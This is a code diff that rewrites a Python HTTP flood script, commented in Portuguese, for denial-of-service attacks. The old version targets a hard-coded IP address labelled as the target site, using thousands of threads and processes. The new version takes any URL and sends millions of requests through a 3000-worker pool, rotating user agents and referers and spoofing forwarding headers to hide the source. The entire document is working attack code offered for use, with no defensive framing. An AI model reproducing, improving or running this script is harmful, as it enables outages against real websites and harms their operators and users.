@@ -1,99 +1,80 @@
-import socket
-import threading
-import multiprocessing
-import random
-import string
+from multiprocessing import Pool
+import urllib.parse, ssl
+import sys, getopt, random, time, os
 import requests
-import base64
-import hashlib
 
-# Configurações do ataque
-target_ip = "177.153.49.2"  # IP do site alvo
-target_port = 80  # Porta HTTP padrão
+def read_user_agents():
+    with open('useragents.txt', 'r') as f:
+        user_agents = f.readlines()
+    return [ua.strip() for ua in user_agents]
 
-# Lendo User Agents do arquivo "useragents.txt"
-with open("useragents.txt", "r") as file:
-    user_agents = file.read().splitlines()
+def read_referers():
+    with open('referers.txt', 'r') as f:
+        referers = f.readlines()
+    return [referer.strip() for referer in referers]
 
-# Lendo Referers do arquivo "referers.txt"
-with open("referers.txt", "r") as file:
-    referers = file.read().splitlines()
+def attack(url):
+    user_agents = read_user_agents()
+    referers = read_referers()
 
-# Lista de Cookies
-cookies = [
-    "session=abcdef123456789",
-    "user_id=12345",
-    # Adicione mais Cookies aqui
-]
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+        'Referer': random.choice(referers),
+        'Connection': 'keep-alive',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Upgrade-Insecure-Requests': '1',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+        'Keep-Alive': '300',
+        'X-Requested-With': 'XMLHttpRequest',
+        'DNT': '1',
+        'X-Forwarded-For': '.'.join(map(str, (random.randint(0, 255) for _ in range(4)))),
+        'X-Forwarded-Proto': 'https',
+        'X-Client-IP': '.'.join(map(str, (random.randint(0, 255) for _ in range(4)))),
+        'X-Remote-IP': '.'.join(map(str, (random.randint(0, 255) for _ in range(4)))),
+        'X-Host': url.split('//')[-1].split('/')[0],
+        # Adicione outros headers conforme necessário
+    }
 
-# Lista de Métodos HTTP
-http_methods = [
-    "GET",
-    "POST",
-    "PUT",
-    "DELETE",
-    # Adicione mais Métodos HTTP aqui
-]
+    try:
+        for _ in range(2000):
+            with Pool(3000) as pool:
+                pool.map(send_request, [(url, headers)] * 5000)
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending request to {url}: {e}")
 
-# Função para gerar IP aleatório
-def get_random_ip():
-    return ".".join(str(random.randint(0, 255)) for _ in range(4))
+def send_request(args):
+    url, headers = args
+    try:
+        response = requests.get(url, headers=headers)
+        print(f"Sent request to {url} with User-Agent: {headers['User-Agent']} and Referer: {headers['Referer']}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending request to {url}: {e}")
 
-# Função para gerar Cookie aleatório
-def get_random_cookie():
-    return random.choice(cookies)
+def main(argv):
+    target_url = ''
 
-# Função para gerar Método HTTP aleatório
-def get_random_http_method():
-    return random.choice(http_methods)
-
-# Função para enviar mensagens HTTP
-def send_http_request():
-    # Criação do socket TCP
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        opts, args = getopt.getopt(argv, "hu:", ["url="])
+    except getopt.GetoptError:
+        print('Usage: script.py -u <target_url>')
+        sys.exit(2)
     
-    while True:
-        ip = get_random_ip()
-        user_agent = random.choice(user_agents)
-        referer = random.choice(referers)
-        cookie = get_random_cookie()
-        http_method = get_random_http_method()
-        
-        headers = f"{http_method} / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {user_agent}\r\nReferer: {referer}\r\nCookie: {cookie}\r\nConnection: keep-alive\r\n\r\n"
-        try:
-            sock.connect((ip, target_port))
-            sock.sendall(headers.encode())
-        except Exception as e:
-            pass
-        finally:
-            sock.close()
+    for opt, arg in opts:
+        if opt == '-h':
+            print('Usage: script.py -u <target_url>')
+            sys.exit()
+        elif opt in ("-u", "--url"):
+            target_url = arg
 
-# Criando Threads
-threads = []
-for _ in range(3000):  # Criando 3000 threads
-    thread = threading.Thread(target=send_http_request)
-    thread.daemon = True
-    thread.start()
-    threads.append(thread)
+    if not target_url:
+        print('Usage: script.py -u <target_url>')
+        sys.exit(2)
 
-# Criando Processos
-processes = []
-for _ in range(3000):  # Criando 3000 processos
-    process = multiprocessing.Process(target=send_http_request)
-    process.daemon = True
-    process.start()
-    processes.append(process)
+    attack(target_url)
 
-# Mantendo os processos e threads em loop infinito
-while True:
-    for thread in threads:
-        if not thread.is_alive():
-            thread = threading.Thread(target=send_http_request)
-            thread.daemon = True
-            thread.start()
-
-    for process in processes:
-        if not process.is_alive():
-            process = multiprocessing.Process(target=send_http_request)
-            process.daemon = True
-            process.start()
+if __name__ == '__main__':
+    main(sys.argv[1:])
